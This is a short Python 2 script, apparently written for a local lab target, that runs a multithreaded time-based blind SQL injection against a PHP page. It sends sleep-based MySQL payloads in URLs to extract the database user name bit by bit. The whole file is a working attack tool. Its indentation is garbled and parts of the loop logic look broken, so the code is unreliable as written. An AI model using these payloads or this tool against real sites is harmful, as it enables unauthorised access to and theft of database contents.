#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright©K7zy
# CreateTime: 2016-10-22 00:09:40

import urllib
import urllib2
import time
import threading
 
 
class blind_injection:
    def __init__(self,thread_num):
        	self.thread_count=self.thread_num=thread_num
        	self.lock=threading.Lock()
        		self.res={}
        		self.resdata={}
		        self.tmp=''
    def _request(self,URL):
        		user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }
		        req = urllib2.Request(URL, None, user_agent)
        		try:
			            request=urllib2.urlopen(req,timeout=2)
        		    except Exception ,e:
			            #time.sleep(0.01)
			            return 'timeout'
		    return request.read()
 
    def bin2dec(self,string_num):
        	return int(string_num,2)
 
 
 
    def _getlength(self,ii):
        	thread_id=int(threading.currentThread().getName())
        	ii=ii+1
        	url="http://10.211.55.20/testmysql.php?test=1'%20and%20if(mid(lpad(bin(length(user())),8,0),"+str(ii)+",1)=1,sleep(2),0)%23"
        	html=self._request(url)
        	#print html
        	verify = 'timeout'
        	if verify not in html:
        	    self.res[str(ii)] = 0
		else:
        	    self.res[str(ii)] = 1
        	self.lock.acquire()
        	self.thread_count-=1
        	self.lock.release()
 
    def _getdata(self,j,x):
        	url="http://10.211.55.20/testmysql.php?test=1'%20and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29," + str(x) + ",1%29%29%29,8,0%29,"+ str(j) + ",1%29%29,sleep%282%29,0%29%23"
        	html=self._request(url)
        	#print url
        	#print html
        	verify = 'timeout'
        	if verify not in html:
        	    self.resdata[str(j)] = 0
		else:
        	    self.resdata[str(j)] = 1
        	self.lock.acquire()
        	self.thread_count-=1
        	self.lock.release()
 
 
    def _getstep(self):
        	self.data=''
        	for x in range(self.datalength):
        	    x=x+1
        	    self.thread_count=8
        	    self.tmp=''
        	    for j in range(self.thread_num):
        	        j=j+1
        	        t=threading.Thread(target=self._getdata,name=str(j),args=(j,x))
        	        t.setDaemon(True)
        	        t.start()
        	        while self.thread_count>0:
        	            time.sleep(0.01)
        	        for i in range(8):
        	            self.tmp=self.tmp+str(self.resdata[str(i+1)])
        	        self.data=self.data+chr(self.bin2dec(self.tmp))
        	    print self.data
 
 
 
 
    def run(self):
        for i in range(self.thread_num):
            t=threading.Thread(target=self._getlength,name=str(i),args=(i,))
            t.setDaemon(True)
            t.start()
            while self.thread_count>0:
                time.sleep(0.01)
            for i in range(8):
                self.tmp = self.tmp + str(self.res[str(i+1)]) 
            self.datalength=self.bin2dec(self.tmp)
            print 'length:'+ str(self.datalength)
            self._getstep()
 
 
if __name__=='__main__':
    d=blind_injection(thread_num=8)
    d.run()
